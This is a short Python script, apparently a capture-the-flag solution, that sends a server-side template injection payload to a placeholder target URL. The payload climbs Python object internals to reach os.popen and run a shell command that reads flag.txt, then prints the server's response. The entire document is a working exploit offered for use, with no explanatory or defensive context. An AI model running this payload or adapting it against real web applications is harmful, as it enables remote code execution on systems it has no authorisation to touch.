import requests

url = 'YOUR_TARGET_URL'
exploit = '{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("cat flag.txt").read()}}'

r = requests.get(url+exploit)
print(r.status_code)
print(r.text)